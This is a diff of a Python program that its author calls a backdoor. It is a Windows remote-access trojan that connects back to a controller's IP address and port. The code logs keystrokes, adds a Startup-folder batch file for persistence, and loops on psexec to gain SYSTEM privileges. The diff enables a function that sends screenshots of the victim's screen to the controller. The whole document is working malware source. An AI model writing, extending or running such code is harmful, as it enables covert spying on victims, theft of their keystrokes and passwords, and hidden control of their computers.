@@ -7,7 +7,7 @@
 #twitter: @rossin135
 
 #github: https://github.com/rossiniroberto52/backdoor.git
-import socket, os, subprocess, webbrowser, shutil, winreg, ctypes, time, random
+import socket, os, subprocess, webbrowser, shutil, winreg, ctypes, time, random, io
 from PIL import ImageGrab
 from pynput.keyboard import Key as key
 from pynput.keyboard import Listener
@@ -19,7 +19,7 @@ from sys import argv
 os.system("cls")
 
 #conn vars
-IP = "192.168.0.3"
+IP = "192.168.0.15"
 PORT = 6667
 
 #most used vars
@@ -34,18 +34,15 @@ def functionPK(key):
     keys.append(key)
     storeKeysToFile(keys)
 
-#def screenshot():
-#    arquive = ImageGrab.grab().save("screenshot.png", "PNG")
-#    filename = "screenshot.png"
-#    conn.send(filename.encode("utf-8"))
-#    file = open(arquive, 'rb')
-#    with open(file, 'rb') as img:
-#        data = img.read(1024)
-#        if not data:
-#            conn.send("error to take or send a picture in victim machine!".encode("utf-8"))
-#        conn.sendall(data)
+def screenshot():
+    #take and save screenshots
+    img = ImageGrab.grab(bbox = (10,10,1930,1090))
+    img_to_send = img.tobytes()
+    size = len(img_to_send)
+    conn.send(bytes(str(size), 'utf-8'))
+    conn.send(img_to_send)
     
-
+    
 def storeKeysToFile(keys):   
     with open('keylog.txt', 'w') as log:  
         for the_key in keys:   
@@ -81,6 +78,7 @@ def bat_create(file_path=""):
         bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER
     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
         bat_file.write(r'start /b %s\\clt.exe' % file_path)
+        bat_file.close()
         msg = "[+] .bat file created!"
         conn.send(msg.encode("utf-8"))
 
@@ -90,9 +88,12 @@ def bat_create(file_path=""):
 def giving_root():
     while True:
         retorno = ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe", u"-accepteula -nobanner -s -d " + temp_path + "\\clt.exe", None, 0)
+        ##only debug mode
+        print(retorno)
         if retorno == 42:
            break
-    time.sleep(random.randint(1,11))
+        time.sleep(random.randint(1,11))
+    exit()
 
 conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 conn.connect((IP,PORT))
@@ -105,8 +106,8 @@ while True:
         break
     if cmd == "/kill":
         kill()
-    #if cmd == "/screenlog":
-    #    screenshot()
+    if cmd == "/screenlog":
+        screenshot()
     if cmd == "/troll":
         link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
         while True:
